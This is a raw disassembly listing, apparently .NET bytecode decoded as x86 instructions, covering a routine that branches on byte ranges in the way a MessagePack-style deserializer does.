  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 c2             	add    %dh,-0x3e(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 ee             	add    %dh,-0x12(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
